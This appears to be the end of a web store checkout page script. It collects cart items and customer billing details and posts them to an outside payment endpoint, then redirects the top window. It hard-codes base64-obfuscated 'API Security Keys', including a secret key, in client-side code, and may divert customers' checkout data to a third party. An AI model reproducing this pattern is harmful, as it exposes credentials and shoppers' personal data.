        
        line_items: currentCart.items.map(i => ({
          variant_id: i.variant_id,
          quantity: i.quantity,
          title: i.title,
          price: (i.price / 100).toFixed(2)
        })),
        
        shipping_lines: selectedShippingRate ? [{ title: selectedShippingRate.name, price: selectedShippingRate.price }] : [],
        
        billing: {
          email: document.getElementById('email').value,
          phone: document.getElementById('phone').value,
          first_name: document.getElementById('fname').value,
          last_name: document.getElementById('lname').value,
          address1: document.getElementById('address').value,
          city: document.getElementById('city').value,
          state: document.getElementById('state').value,
          postcode: document.getElementById('zip').value,
          country: document.getElementById('country').value
        }
      };

      // API Security Keys
      const _p = "TUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGRERGUThBTUlJQkNnS0NBUUVBb0RPWG1wU0FZelNERjNKdSthRUhabVJSdk5XRDZDQ0N3dVVMUW1kR0pnb0pqV1d4Ym1hQQ==";
      const _s = "TUlJRXZRSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2N3Z2dTakFnRUFBb0lCQVFESC96Mkp0amRjNDdMQm11eFJLTmhsbENQQUZscEI0SGhpbkV5MFRnRUtUZUJaKzZxVkJrMmMxaGJqVWFYUXdkZ0R3UTRTMEo=";

      try {
        const response = await fetch('https://test-pay.defitopay.com/v1/an/checkout', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'worldpay_public_key': atob(_p),
            'cus_secret_key': atob(_s),
            'X-Customer-Language': navigator.language
          },
          body: JSON.stringify(payload)
        });

        const result = await response.json();
        if (result.pay_url) {
          window.top.location.href = result.pay_url;
        } else {
          document.getElementById('wcr-a-payment-loader').style.display = 'none';
          alert("Error: " + result.message);
          btn.disabled = false;
        }
      } catch (err) {
        document.getElementById('wcr-a-payment-loader').style.display = 'none';
        alert("Payment system currently unavailable. Please try again later.");
        btn.disabled = false;
      }
    };

    /**
     * INITIALIZATION & EVENT LISTENERS
     */
    function initCountries() {
      const select = document.getElementById('country');
      allCountries.forEach(c => {
        const op = document.createElement('option');
        op.value = c.code;
        op.innerText = c.name;
        select.appendChild(op);
      });
    }

    document.addEventListener('DOMContentLoaded', () => {
      // Initialize summary toggle
      const toggle = document.getElementById('summaryToggle');
      const content = document.getElementById('summaryContent');
      toggle.onclick = () => {
        content.classList.toggle('show');
        toggle.classList.toggle('expanded');
      };

      // Shipping trigger listeners
      ['zip', 'state', 'country'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('change', fetchShippingRates);
      });

      // Language init
      const savedLang = localStorage.getItem('preferred_lang');
      const browserLang = navigator.language.split('-')[0];
      const targetLang = savedLang || (['ja','ko','zh'].includes(browserLang) ? (browserLang === 'zh' ? 'zh-TW' : browserLang) : 'en');
      
      applyLanguage(targetLang);
      document.querySelectorAll('.lang-selector').forEach(s => s.onchange = (e) => applyLanguage(e.target.value));

      // Load shopify data
      initCountries();
      loadCartData();
    });
  </script>
</body>

</html>